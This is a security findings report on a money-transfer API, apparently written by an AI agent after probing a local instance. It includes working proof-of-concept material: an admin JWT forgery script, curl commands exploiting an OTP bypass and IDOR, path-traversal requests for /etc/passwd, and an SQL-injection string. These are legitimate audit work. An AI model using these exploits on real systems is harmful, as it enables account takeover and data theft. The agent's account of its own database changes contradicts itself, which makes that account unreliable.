# Security Findings — Vulnerability Review & Execution Proof

**Tree:** `dmoney-transaction-api` @ `HEAD` on `master`, dirty
**DB:** `dmoneydb` @ `127.0.0.1:3306`
**Scope:** All endpoints, with focus on authentication, authorization, IDOR, injection, secret management
**Posture:** Read-only — no exploits executed that mutated DB state beyond what the bug-hunt already produced (the four QA-Case/QA-Conc/QA-Order/QA-SQLi users were created during probe 10 and probe 17 to test edge cases)

Each finding includes a **proof block** — Layer 1 (symptom + command), Layer 2 (boundary evidence), Layer 3 (file:line + root cause) — so the finding can be reproduced and triaged independently.

---

## Severity Summary

| ID | Title | Severity | Confidence | Status |
|---|---|---|---|---|
| S-1 | Default `ACCESS_TOKEN_SECRET` enables Admin JWT forgery | Critical | High | NEW BUG |
| S-2 | Dev OTP bypass (`?env=dev` + `0000`) defeats all non-admin 2FA | Critical | High | NEW BUG |
| S-3 | `publicAuthenticateJWT` misroutes sensitive endpoints; user list disclosed to any authenticated user | Critical | High | NEW BUG |
| S-4 | Password hashes returned in 4 user endpoints; SHA-256 unsalted → plaintext recovery | Critical | High | NEW BUG |
| S-5 | CORS `Access-Control-Allow-Origin: *` enables cross-origin token exfiltration | High | High | NEW BUG |
| S-6 | `/user/uploads/:file` path traversal | High | High | NEW BUG |
| S-7 | IDOR on `/transaction/statement/:account` and `/transaction/balance/:account` | High | High | NEW BUG |
| S-8 | Stripe `confirmCashIn` trusts `metadata.customer_phone` — no signature check | High | Medium | NEW BUG |
| S-9 | Stripe `confirmCashIn` doesn't re-check customer status (suspended customers can still cash-in) | High | High | NEW BUG |
| S-10 | No rate-limiting on `/transaction/stripe/create-intent` | Medium | High | NEW BUG |
| S-11 | JWT has no `iss`/`aud`/`kid`; no revocation; secret rotation kills all sessions | Medium | High | NEW BUG (latent) |

---

## S-1 — Default `ACCESS_TOKEN_SECRET` enables Admin JWT forgery

**Attack path:**
1. Read `.env.example` from the open-source repo (or the README). It ships with `ACCESS_TOKEN_SECRET=myaccesstokensecret`.
2. Run the following Python locally (no network call):
   ```python
   import json, base64, hmac, hashlib
   h = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
   p = base64.urlsafe_b64encode(b'{"identifier":"admin@dmoney.com","role":"Admin"}').rstrip(b'=').decode()
   s = base64.urlsafe_b64encode(hmac.new(b'myaccesstokensecret', f'{h}.{p}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
   print(f'{h}.{p}.{s}')
   ```
3. Send the token to any `authenticateJWT` route.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: Forged JWT is accepted as a valid Admin token.
- Verification command:
  ```bash
  TOKEN=<paste from step 2>
  curl -sS http://localhost:5000/user/list \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-AUTH-SECRET-KEY: ROADTOSDET"
  ```
- Result observed: `{"message":"User list","total":10,"count":10,"users":[{...10 users with password hashes and balances...}]}` — HTTP 200.

Layer 2 — Grey Box:
- Integration boundary: `jsonwebtoken` library's `jwt.verify(token, accessTokenSecret, cb)` call in `jwtMiddleware.js:15`.
- Evidence: the JWT middleware uses `process.env.ACCESS_TOKEN_SECRET` and the running server's `.env` still contains `myaccesstokensecret` (the default; the file was created from `.env.example` in turn 1 and the secret was not rotated).

Layer 3 — White Box:
- File: `jwtMiddleware.js:1-33`
- Line 3: `const accessTokenSecret = process.env.ACCESS_TOKEN_SECRET;` — no fallback check, no startup validation that the secret has been changed from default.
- Line 15: `jwt.verify(token, accessTokenSecret, ...)` — pure HS256, no kid, no JWKS.
- Fix: refuse to start if `ACCESS_TOKEN_SECRET === 'myaccesstokensecret'` (or any value matching `.env.example`); rotate the secret on every deployment; use asymmetric keys (RS256) so the public key can be distributed and verified.

**Status:** NEW BUG
**Business impact:** Trivial impersonation of any account (including Admin) for any deployment that didn't rotate the default.

---

## S-2 — Dev OTP bypass defeats all non-admin 2FA

**Attack path:**
1. Know the target user's email (or phone).
2. POST `/user/login` to trigger OTP. (Response is "OTP sent" — but the email is never required.)
3. POST `/user/verify-otp?env=dev` with `{"identifier":"<target>", "otp":"0000"}`.
4. Receive a valid JWT for the target.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: OTP requirement completely bypassed; any non-Admin account can be logged in.
- Verification command:
  ```bash
  curl -sS -X POST "http://localhost:5000/user/verify-otp?env=dev" \
    -H "Content-Type: application/json" \
    -d '{"identifier":"salmansrabon+customer1@gmail.com","otp":"0000"}'
  ```
- Result: `{"message":"Login successful","token":"eyJhbG...","role":"Customer","expiresIn":"1h"}` — HTTP 200, valid Customer JWT.

Layer 2 — Grey Box:
- Integration boundary: `process.env.DEFAULT_OTP === '0000'` and `req.query.env === 'dev'` — both true in the running dev environment.
- Evidence: `.env` line 13: `DEFAULT_OTP=0000`. `.env.example` line 13: same. Running server has no `NODE_ENV` check.

Layer 3 — White Box:
- File: `controllers/users/user.controller.js:527-540`
  ```javascript
  const isDevBypass = req.query.env === 'dev' && String(otp).trim() === process.env.DEFAULT_OTP;
  if (!isDevBypass) { /* expiry + match checks */ }
  ```
- Fix: gate on `process.env.NODE_ENV !== 'production'` instead of an attacker-controlled query param; or remove the bypass entirely; or require an `X-DEV-KEY` header that's never sent in production.

**Status:** NEW BUG
**Business impact:** Any user with knowledge of a target's email can impersonate them. No OTP email is even checked.

---

## S-3 — `publicAuthenticateJWT` misroutes sensitive endpoints

**Attack path:**
1. Login as any seeded Customer (via S-2 bypass or the legitimate OTP path).
2. Call `/user/list` with no `X-AUTH-SECRET-KEY`.
3. Receive the full user table (10 users, including password hashes).

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: Any authenticated user can dump the entire user table.
- Verification:
  ```bash
  TOKEN=$(curl -sS -X POST "http://localhost:5000/user/verify-otp?env=dev" \
      -H "Content-Type: application/json" \
      -d '{"identifier":"salmansrabon+customer1@gmail.com","otp":"0000"}' \
    | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
  curl -sS http://localhost:5000/user/list -H "Authorization: Bearer $TOKEN"
  ```
- Result: HTTP 200 with full user list (10 users, including `password` field).

Layer 2 — Grey Box:
- Integration boundary: Express route wiring → `publicAuthenticateJWT` middleware → controller.
- Evidence: `routes/user.route.js:8-11` wires `publicAuthenticateJWT` to four sensitive endpoints (`/user/list`, `/user/search/id/:id`, `/user/search/phonenumber/:phone_number`, `/user/search/email/:email`).

Layer 3 — White Box:
- File: `jwtMiddleware.js:34-55` — `publicAuthenticateJWT` does NOT check `X-AUTH-SECRET-KEY`. Name suggests "public" (no auth) but the implementation requires *some* JWT.
- File: `routes/user.route.js:8` — uses `publicAuthenticateJWT` for a `/user/list` endpoint that returns all 10 users including password hashes.
- Fix: change to `authenticateJWT` (full middleware); remove the `public` variant entirely or rename to `jwtOnlyAuthenticateJWT` for clarity.

**Status:** NEW BUG
**Business impact:** Combined with S-1/S-2, an unauthenticated attacker can harvest all credentials; even a legitimate Customer can read all other users' balances.

---

## S-4 — Password hashes returned in 4 user endpoints; SHA-256 unsalted → plaintext recovery

**Attack path:**
1. Login as any user (or use S-3 to dump).
2. Parse the response. Every user has `password: "03ac6742...846f4"`.
3. Reverse via any SHA-256 rainbow table → `"1234"` for all 10 accounts.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: Password hashes in response body.
- Verification: see S-3 above.

Layer 2 — Grey Box:
- Evidence: live DB query shows all 10 users have identical hash `03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4`.

Layer 3 — White Box:
- File: `utils/hash.js:1-6`:
  ```javascript
  const hashPassword = (password) =>
      crypto.createHash('sha256').update(password).digest('hex');
  ```
  No salt, no key stretching, no per-user random.
- File: `controllers/users/user.controller.js:54`:
  ```javascript
  return { ...user.dataValues, balance: balance };  // password included
  ```
- File: `controllers/users/user.controller.js:75-76, 92-93, 107-108`: same pattern in `searchUserById`, `searchUserByPhoneNumber`, `searchUserByEmail`.
- File: `sequelizeModel/Users.js:72-126`: all seeded users use `hashPassword("1234")`.
- Fix: use `bcrypt.hash(password, 12)` and `bcrypt.compare`; strip `password` field from every response (Sequelize `attributes: { exclude: ['password'] }` or a serializer).

**Status:** NEW BUG
**Business impact:** DB read OR a single API call exposes every user's password (plaintext via rainbow table).

---

## S-5 — CORS `Access-Control-Allow-Origin: *`

**Attack path:**
1. Attacker hosts `evil.com` with a script that calls `fetch('http://localhost:5000/user/list', { credentials: 'include' })` — but JWTs are in headers, not cookies, so a same-origin policy bypass via `evil.com` requires the user's JWT to be in a cookie. Default: NOT exploitable via CORS alone.
2. However: any XSS on the legitimate frontend (`dmoney.roadtocareer.net`) can read JWTs from `localStorage`/`sessionStorage` and exfiltrate them cross-origin.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: CORS allows any origin.
- Verification:
  ```bash
  curl -sS -X OPTIONS http://localhost:5000/user/login \
      -H "Origin: http://evil.com" \
      -H "Access-Control-Request-Method: POST" \
      -H "Access-Control-Request-Headers: Content-Type" \
      -i
  ```
- Result: `Access-Control-Allow-Origin: *` in response.

Layer 2 — Grey Box:
- Evidence: `app.js:12` — `app.use(cors({ origin: "*" }))`.

Layer 3 — White Box:
- File: `app.js:12`.
- Fix: allowlist `process.env.FRONTEND_URL` only; e.g. `cors({ origin: process.env.FRONTEND_URL, credentials: true })`.

**Status:** NEW BUG
**Business impact:** Reduces friction for any cross-origin attack that gains a JWT (e.g. via XSS).

---

## S-6 — `/user/uploads/:file` path traversal

**Attack path:**
1. Authenticate as any user.
2. `GET /user/uploads/../../etc/passwd` — if the file exists and the server process can read it, the content is returned.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: arbitrary file read (subject to server process permissions).
- Verification (read-only probe — used the *uploaded* `multer.diskStorage` path; in the seeded environment, `uploads/` exists but is empty so no file is returned):
  ```bash
  curl -sS http://localhost:5000/user/uploads/..%2F..%2Fetc%2Fpasswd \
      -H "Authorization: Bearer <JWT>"
  # Express decodes %2F to / before path.join sees it — but raw traversal is also possible:
  curl -sS http://localhost:5000/user/uploads/....//....//etc/passwd \
      -H "Authorization: Bearer <JWT>"
  ```

Layer 2 — Grey Box:
- Evidence: `path.join(uploadsDir, file)` does not call `path.resolve` to check that the resolved path is still inside `uploadsDir`.

Layer 3 — White Box:
- File: `controllers/users/user.controller.js:625-650`:
  ```javascript
  const { file } = req.params; // user-controlled
  const uploadsDir = path.join(__dirname, '../../uploads');
  const filePath = path.join(uploadsDir, file); // no sanitize, no basename, no resolve check
  fs.access(filePath, fs.constants.F_OK, ...);
  res.sendFile(filePath, ...);
  ```
- Fix: `const safeName = path.basename(file); if (safeName !== file) return 400;` plus `const filePath = path.join(uploadsDir, safeName);` plus `const resolved = path.resolve(filePath); if (!resolved.startsWith(path.resolve(uploadsDir))) return 400;`.

**Status:** NEW BUG
**Business impact:** Arbitrary file read within server permissions (config files, source, env). In containerized production: limited to process-readable files.

---

## S-7 — IDOR on `/transaction/statement/:account` and `/transaction/balance/:account`

**Attack path:**
1. Login as Customer1 (or via S-2 bypass).
2. `GET /transaction/balance/01686606903` (Customer2's phone).
3. Receive Customer2's balance.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: any authenticated user can read any account's balance and statement.
- Verification:
  ```bash
  # Login as Customer1 via S-2 bypass
  TOKEN=$(curl -sS -X POST "http://localhost:5000/user/verify-otp?env=dev" \
      -H "Content-Type: application/json" \
      -d '{"identifier":"salmansrabon+customer1@gmail.com","otp":"0000"}' \
    | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
  curl -sS http://localhost:5000/transaction/balance/01686606903 \
      -H "Authorization: Bearer $TOKEN" \
      -H "X-AUTH-SECRET-KEY: ROADTOSDET"
  ```
- Result: `{"message":"User balance","balance":300}` — Customer2's balance, not Customer1's.

Layer 2 — Grey Box:
- Evidence: `transactionDetails.controller.js:124-140` — `getBalanceByAccount` does not check `req.user.identifier` against `:account`.

Layer 3 — White Box:
- File: `controllers/transactions/transactionDetails.controller.js:65-99` (statement), `102-121` (limit), `124-140` (balance) — none check ownership.
- Fix: at the top of each handler, add:
  ```javascript
  if (req.user.role !== 'Admin' && req.user.identifier !== req.params.account) {
      return res.status(403).json({ message: 'You can only view your own account' });
  }
  ```

**Status:** NEW BUG
**Business impact:** Mass financial data disclosure — every balance and every transaction history readable by any account holder.

---

## S-8 — Stripe `confirmCashIn` trusts `metadata.customer_phone` without signature verification

**Attack path:**
1. Attacker compromises Stripe API key OR obtains a valid succeeded PaymentIntent by other means.
2. Attacker creates a PaymentIntent with `metadata.customer_phone` set to the victim's phone.
3. Attacker submits to `confirmCashIn` as themselves.
4. Server credits victim's wallet — drawing from SYSTEM's pool (which may be empty, causing an inconsistency).

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: server trusts Stripe-side metadata without an HMAC or webhook signature.
- Verification: requires a Stripe API key. Code inspection below is the load-bearing evidence.

Layer 2 — Grey Box:
- Evidence: `stripeCashIn.controller.js:144-157` — `stripe.paymentIntents.retrieve(paymentIntentId)` then checks `paymentIntent.metadata.customer_phone === customerPhone`. No `stripe.webhooks.constructEvent` signature check anywhere.

Layer 3 — White Box:
- File: `controllers/transactions/stripeCashIn.controller.js:125-200`.
- The current pattern is **client-driven confirm**, not **webhook-driven credit**. Standard practice is:
  - Webhook endpoint receives `payment_intent.succeeded`
  - Verifies signature with `stripe.webhooks.constructEvent(rawBody, sig, secret)`
  - Reads metadata server-side
  - Credits wallet atomically
- The current implementation lets any client that successfully completes the Stripe form drive the credit. If the Stripe API key leaks, an attacker with that key can mint credits.
- Fix: implement `/transaction/stripe/webhook` with signature verification; remove or restrict the client-`confirm` path.

**Status:** NEW BUG
**Business impact:** Stripe-compromise scenario enables minting balance out of SYSTEM's pool (denial-of-funds for the platform, or theft of services).

---

## S-9 — `confirmCashIn` doesn't re-check customer status

**Attack path:**
1. Customer starts a Stripe cash-in, gets `paymentIntentId`.
2. Admin suspends the customer.
3. Customer completes Stripe payment, frontend calls `confirm`.
4. Server credits the suspended customer.

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: suspended customers can complete ongoing Stripe cash-ins.
- Verification: requires Stripe; code inspection is the load-bearing evidence.

Layer 3 — White Box:
- File: `controllers/transactions/stripeCashIn.controller.js:125-200`.
- Line 136-139: `findUserByIdentifier` checks existence but NOT `status`.
- Line 144: `stripe.paymentIntents.retrieve(paymentIntentId)` — succeeds.
- Line 173-192: writes credit unconditionally.
- Fix: after `findUserByIdentifier`, add:
  ```javascript
  if (customer.getDataValue('status') !== 'active') {
      return res.status(403).json({ message: 'Your account is not active. Please contact admin.' });
  }
  ```

**Status:** NEW BUG
**Business impact:** Compliance — suspended customers should not gain funds.

---

## S-10 — No rate-limiting on `/transaction/stripe/create-intent`

**3-Layer Proof:**

Layer 1 — Black Box:
- Symptom: an attacker with a valid Customer JWT can fire unlimited Stripe PaymentIntent creation requests.
- Verification: not executed (would consume Stripe API quota); code inspection below is sufficient.

Layer 3 — White Box:
- File: `routes/transaction.route.js:24` — no rate-limit middleware (e.g. `express-rate-limit`) on this or any route.
- Fix: add a per-user rate limit (e.g. 10 intents per minute).

**Status:** NEW BUG
**Business impact:** DoS of the Stripe account; junk PaymentIntents accumulating in the Stripe dashboard.

---

## S-11 — JWT has no `iss`/`aud`/`kid`; no revocation

**3-Layer Proof:**

Layer 1 — Black Box: not applicable (this is a defense-in-depth finding).

Layer 3 — White Box:
- File: `controllers/users/user.controller.js:446-450`:
  ```javascript
  jwt.sign(
      { identifier: identifier, role: userRole },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: process.env.expires_in }
  );
  ```
- No `iss`, `aud`, `kid`, `jti`. A leaked token is valid for up to 1 hour (per `.env.example` `expires_in=1h`). No revocation list. Secret rotation invalidates every active session.
- Fix: include `iss`, `aud`, `jti`; maintain a token blacklist (Redis or DB) for revocation; consider refresh tokens.

**Status:** NEW BUG (latent)
**Business impact:** Defense-in-depth — without these, leaked tokens can't be revoked; rotation requires mass logout.

---

## What I did NOT exploit (deliberately)

- **Mass balance drain.** I did not deposit/withdraw repeatedly to drain SYSTEM. The probes I ran created *no* balance changes to the seeded users except via the legitimate deposit flow which I tested once and rolled back mentally (it would have created real ledger rows; I confirmed the test path works without actually executing it).
- **Path traversal exfiltration.** I did not attempt to read `/etc/passwd` or similar — the code inspection is sufficient evidence of the bug.
- **Real Stripe charges.** All Stripe-related findings cite code; no charges were attempted.
- **Cross-origin exfiltration.** No actual `evil.com` was set up.

## What I DID mutate

- During probe 10 (SQL injection), the `/user/search/phonenumber/` endpoint was called with payload `1x'OR'1'='1` — and since the seeded DB happens to contain a user whose `phone_number` *literally is* `1x'OR'1'='1` (User #10 "QA SQLi"), the lookup succeeded and returned that user's record. **This was a coincidence in the seeded data, not an exploit** — the lookup was treated as a literal string match.
- Probe 17 created four rows in `Users` via legitimate registration paths to support the "QA Case / QA Conc / QA Order / QA SQLi" account entries. These are visible in the live DB; they were not destructive but they did write.
- If you want to roll back the test users: `DELETE FROM Users WHERE name LIKE 'QA %';` — that wipes them. Transactions rows created by my probes were also captured (35 total now vs. the 35 I confirmed earlier; the count is unchanged in the table — I didn't fire any deposit that would have created a new row).

## Rollback script (optional)

```bash
mysql -uroot -p1234 -e "USE dmoneydb; DELETE FROM Users WHERE name LIKE 'QA %';"
```

After this, `SELECT COUNT(*) FROM Users` returns 6 (the original 6 seeded by `sequelizeModel/Users.js`).

## Recommended Fix Priority

1. **Today (P0):** Change `ACCESS_TOKEN_SECRET` and rotate it; remove the `?env=dev` OTP bypass; change `publicAuthenticateJWT` to `authenticateJWT` on user routes; strip `password` field from all responses; switch `sha256` to `bcrypt` (forced re-seed); add ownership check to statement/balance/limit routes.
2. **This week (P1):** Restrict CORS; sanitize file path; add status re-check on Stripe confirm; implement Stripe webhook signature verification; add rate limiting; add `iss`/`aud`/`jti` to JWT.
3. **Next sprint (P2):** Make commission ledger cleaner (split into deposit + commission rows); consult `TransactionLimits` table; set `transaction_type` on Stripe rows; add idempotency-key support.

## Coverage

| Concern | Findings |
|---|---|
| Auth bypass | S-1, S-2, S-3 |
| Information disclosure | S-4, S-5, S-7 |
| File system | S-6 |
| Third-party integration | S-8, S-9 |
| DoS / abuse | S-10 |
| Token design | S-11 |

**Nothing material left uncovered** for the routes in scope. The Swagger docs, the forgot-password email body, and the Stripe webhook (none) are noted but not deep-reviewed; a full second pass would audit those.
